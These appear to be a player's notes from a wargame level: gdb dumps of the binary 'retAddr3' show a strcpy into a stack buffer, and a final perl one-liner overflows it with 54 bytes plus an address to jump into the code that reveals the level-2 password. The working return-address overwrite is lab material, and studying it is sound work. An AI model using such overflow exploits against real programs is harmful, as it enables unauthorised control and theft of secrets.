
```
Reading symbols from retAddr3...(no debugging symbols found)...done.
(gdb) break function
Breakpoint 1 at 0x80485d1
(gdb) disassemble main
Dump of assembler code for function main:
   0x08048759 <+0>:     lea    0x4(%esp),%ecx
   0x0804875d <+4>:     and    $0xfffffff0,%esp
   0x08048760 <+7>:     pushl  -0x4(%ecx)
   0x08048763 <+10>:    push   %ebp
   0x08048764 <+11>:    mov    %esp,%ebp
   0x08048766 <+13>:    push   %ebx
   0x08048767 <+14>:    push   %ecx
   0x08048768 <+15>:    sub    $0x10,%esp
   0x0804876b <+18>:    mov    %ecx,%ebx
   0x0804876d <+20>:    movl   $0x8048994,-0xc(%ebp)
   0x08048774 <+27>:    call   0x8048652 <verifyLevelDecryption>
   0x08048779 <+32>:    test   %eax,%eax
   0x0804877b <+34>:    je     0x804879a <main+65>
   0x0804877d <+36>:    sub    $0x8,%esp
   0x08048780 <+39>:    pushl  -0xc(%ebp)
   0x08048783 <+42>:    push   $0x8048a28
   0x08048788 <+47>:    call   0x8048400 <printf@plt>
   0x0804878d <+52>:    add    $0x10,%esp
   0x08048790 <+55>:    sub    $0xc,%esp
   0x08048793 <+58>:    push   $0x0
   0x08048795 <+60>:    call   0x8048450 <exit@plt>
   0x0804879a <+65>:    cmpl   $0x1,(%ebx)
   0x0804879d <+68>:    jg     0x80487bf <main+102>
   0x0804879f <+70>:    mov    0x4(%ebx),%eax
   0x080487a2 <+73>:    mov    (%eax),%eax
   0x080487a4 <+75>:    sub    $0x8,%esp
   0x080487a7 <+78>:    push   %eax
   0x080487a8 <+79>:    push   $0x8048a2b
   0x080487ad <+84>:    call   0x8048400 <printf@plt>
   0x080487b2 <+89>:    add    $0x10,%esp
   0x080487b5 <+92>:    sub    $0xc,%esp
   0x080487b8 <+95>:    push   $0x0
   0x080487ba <+97>:    call   0x8048450 <exit@plt>
   0x080487bf <+102>:   movl   $0x0,-0x10(%ebp)
   0x080487c6 <+109>:   mov    0x4(%ebx),%eax
   0x080487c9 <+112>:   add    $0x4,%eax
   0x080487cc <+115>:   mov    (%eax),%eax
   0x080487ce <+117>:   push   %eax
   0x080487cf <+118>:   push   $0x3
   0x080487d1 <+120>:   push   $0x2
   0x080487d3 <+122>:   push   $0x1
   0x080487d5 <+124>:   call   0x80485cb <function>
   0x080487da <+129>:   add    $0x10,%esp
   0x080487dd <+132>:   movl   $0x1,-0x10(%ebp)
   0x080487e4 <+139>:   cmpl   $0x0,-0x10(%ebp)
   0x080487e8 <+143>:   jne    0x80487fc <main+163>
   0x080487ea <+145>:   sub    $0xc,%esp
   0x080487ed <+148>:   push   $0x8048a3f
   0x080487f2 <+153>:   call   0x8048440 <puts@plt>
   0x080487f7 <+158>:   add    $0x10,%esp
   0x080487fa <+161>:   jmp    0x8048829 <main+208>
   0x080487fc <+163>:   cmpl   $0x2,-0x10(%ebp)
   0x08048800 <+167>:   jne    0x8048819 <main+192>
   # here...
   0x08048802 <+169>:   sub    $0xc,%esp
   0x08048805 <+172>:   push   $0x8048a50
   0x0804880a <+177>:   call   0x8048440 <puts@plt>
   0x0804880f <+182>:   add    $0x10,%esp
   0x08048812 <+185>:   call   0x80486ed <getLevel2Password>
   0x08048817 <+190>:   jmp    0x8048829 <main+208>
   0x08048819 <+192>:   sub    $0xc,%esp
   0x0804881c <+195>:   push   $0x8048a3f
   0x08048821 <+200>:   call   0x8048440 <puts@plt>
   0x08048826 <+205>:   add    $0x10,%esp
   0x08048829 <+208>:   nop
   0x0804882a <+209>:   lea    -0x8(%ebp),%esp
   0x0804882d <+212>:   pop    %ecx
   0x0804882e <+213>:   pop    %ebx
   0x0804882f <+214>:   pop    %ebp
   0x08048830 <+215>:   lea    -0x4(%ecx),%esp
   0x08048833 <+218>:   ret    
End of assembler dump.
(gdb) 
```

```
(gdb) r AAAA
Starting program: /home/level1/Desktop/retAddr3 AAAA

Breakpoint 1, 0x080485d1 in function ()
(gdb) info reg
eax            0xbffff71f       -1073744097
ecx            0x10     16
edx            0xfffff948       -1720
ebx            0xbffff530       -1073744592
esp            0xbffff490       0xbffff490
ebp            0xbffff4e8       0xbffff4e8
esi            0xb7fb4000       -1208270848
edi            0x0      0
eip            0x80485d1        0x80485d1 <function+6>
eflags         0x286    [ PF SF IF ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0

```
```
(gdb) disassemble function
Dump of assembler code for function function:
   0x080485cb <+0>:     push   %ebp
   0x080485cc <+1>:     mov    %esp,%ebp
   0x080485ce <+3>:     sub    $0x58,%esp
=> 0x080485d1 <+6>:     mov    0x8(%ebp),%ecx
   0x080485d4 <+9>:     mov    0xc(%ebp),%edx
   0x080485d7 <+12>:    mov    0x10(%ebp),%eax
   0x080485da <+15>:    mov    %cl,-0x4c(%ebp)
   0x080485dd <+18>:    mov    %dl,-0x50(%ebp)
   0x080485e0 <+21>:    mov    %al,-0x54(%ebp)
   0x080485e3 <+24>:    movl   $0xa,-0xc(%ebp)
   0x080485ea <+31>:    movw   $0x18,-0xe(%ebp)
   0x080485f0 <+37>:    movl   $0x0,-0x22(%ebp)
   0x080485f7 <+44>:    movl   $0x0,-0x1e(%ebp)
   0x080485fe <+51>:    movl   $0x0,-0x1a(%ebp)
   0x08048605 <+58>:    movl   $0x0,-0x16(%ebp)
   0x0804860c <+65>:    movl   $0x0,-0x12(%ebp)
   0x08048613 <+72>:    movl   $0x0,-0x32(%ebp)
   0x0804861a <+79>:    movl   $0x0,-0x2e(%ebp)
   0x08048621 <+86>:    movl   $0x0,-0x2a(%ebp)
   0x08048628 <+93>:    movl   $0x0,-0x26(%ebp)
   0x0804862f <+100>:   movl   $0x0,-0x3a(%ebp)
   0x08048636 <+107>:   movl   $0x0,-0x36(%ebp)
   0x0804863d <+114>:   sub    $0x8,%esp
   0x08048640 <+117>:   pushl  0x14(%ebp)
   0x08048643 <+120>:   lea    -0x32(%ebp),%eax
   0x08048646 <+123>:   push   %eax
   0x08048647 <+124>:   call   0x8048430 <strcpy@plt>
   0x0804864c <+129>:   add    $0x10,%esp
   0x0804864f <+132>:   nop
   0x08048650 <+133>:   leave  
   0x08048651 <+134>:   ret    
End of assembler dump.
```

(gdb) info frame
Stack level 0, frame at 0xbffff4f0:
 eip = 0x80485d1 in function; saved eip = 0x80487da
 called by frame at 0xbffff530
 Arglist at 0xbffff4e8, args: 
 Locals at 0xbffff4e8, Previous frame's sp is 0xbffff4f0
 Saved registers:
  ebp at 0xbffff4e8, eip at 0xbffff4ec
(gdb) bt
#0  0x080485d1 in function ()
#1  0x080487da in main ()
(gdb) 
#0  0x080485d1 in function ()
#1  0x080487da in main ()
(gdb) frame 0
#0  0x080485d1 in function ()
(gdb) frame
#0  0x080485d1 in function ()
(gdb) info frame
Stack level 0, frame at 0xbffff4f0:
 eip = 0x80485d1 in function; saved eip = 0x80487da
 called by frame at 0xbffff530
 Arglist at 0xbffff4e8, args: 
 Locals at 0xbffff4e8, Previous frame's sp is 0xbffff4f0
 Saved registers:
  ebp at 0xbffff4e8, eip at 0xbffff4ec
(gdb) x/8xw 0xbffffee8
0xbffffee8:     0x4444415f      0x53534552      0x696e753d      0x61703a78
0xbffffef8:     0x2f3d6874      0x2f6e7572      0x72657375      0x3030312f
(gdb) x/20xw 0xbffffee8
0xbffffee8:     0x4444415f      0x53534552      0x696e753d      0x61703a78
0xbffffef8:     0x2f3d6874      0x2f6e7572      0x72657375      0x3030312f
0xbfffff08:     0x75622f33      0x44580073      0x55525f47      0x4d49544e
0xbfffff18:     0x49445f45      0x722f3d52      0x752f6e75      0x2f726573
0xbfffff28:     0x33303031      0x54415000      0x682f3d48      0x2f656d6f
(gdb) x/20xw 0xbffff4e8
0xbffff4e8:     0xbffff518      0x080487da      0x00000001      0x00000002
0xbffff4f8:     0x00000003      0xbffff71f      0x00000002      0xbffff5c4
0xbffff508:     0x00000000      0x08048994      0xbffff530      0x00000000
0xbffff518:     0x00000000      0xb7df4f21      0xb7fb4000      0xb7fb4000
0xbffff528:     0x00000000      0xb7df4f21      0x00000002      0xbffff5c4
(gdb) x/58xw 0xbffff4e8
0xbffff4e8:     0xbffff518      0x080487da      0x00000001      0x00000002
0xbffff4f8:     0x00000003      0xbffff71f      0x00000002      0xbffff5c4
0xbffff508:     0x00000000      0x08048994      0xbffff530      0x00000000
0xbffff518:     0x00000000      0xb7df4f21      0xb7fb4000      0xb7fb4000
0xbffff528:     0x00000000      0xb7df4f21      0x00000002      0xbffff5c4
0xbffff538:     0xbffff5d0      0xbffff554      0x00000001      0x00000000
0xbffff548:     0xb7fb4000      0xb7fe776a      0xb7fff000      0x00000000
0xbffff558:     0xb7fb4000      0x00000000      0x00000000      0xee798310
0xbffff568:     0xaf0e2500      0x00000000      0x00000000      0x00000000
0xbffff578:     0x00000002      0x080484b0      0x00000000      0xb7fece30
0xbffff588:     0xb7fe79c0      0x0804a000      0x00000002      0x080484b0
0xbffff598:     0x00000000      0x080484e2      0x08048759      0x00000002
0xbffff5a8:     0xbffff5c4      0x08048840      0x080488a0      0xb7fe79c0
0xbffff5b8:     0xbffff5bc      0xb7fff940      0x00000002      0xbffff701
0xbffff5c8:     0xbffff71f      0x00000000
(gdb) x/16xw 0xbffff4e8
0xbffff4e8:     0xbffff518      0x080487da      0x00000001      0x00000002
0xbffff4f8:     0x00000003      0xbffff71f      0x00000002      0xbffff5c4
0xbffff508:     0x00000000      0x08048994      0xbffff530      0x00000000
0xbffff518:     0x00000000      0xb7df4f21      0xb7fb4000      0xb7fb4000



```
(gdb) x/32xw 0xbffff4e8 
0xbffff4e8:     0xbffff518      0x080487da      0x00000001      0x00000002
0xbffff4f8:     0x00000003      0xbffff71f      0x00000002      0xbffff5c4
0xbffff508:     0x00000000      0x08048994      0xbffff530      0x00000000
0xbffff518:     0x00000000      0xb7df4f21      0xb7fb4000      0xb7fb4000
0xbffff528:     0x00000000      0xb7df4f21      0x00000002      0xbffff5c4
0xbffff538:     0xbffff5d0      0xbffff554      0x00000001      0x00000000
0xbffff548:     0xb7fb4000      0xb7fe776a      0xb7fff000      0x00000000
0xbffff558:     0xb7fb4000      0x00000000      0x00000000      0xee798310
```





```
 ./retAddr3 $(perl -e 'print "A"x54 . "\x02\x88\x04\x08"')

```

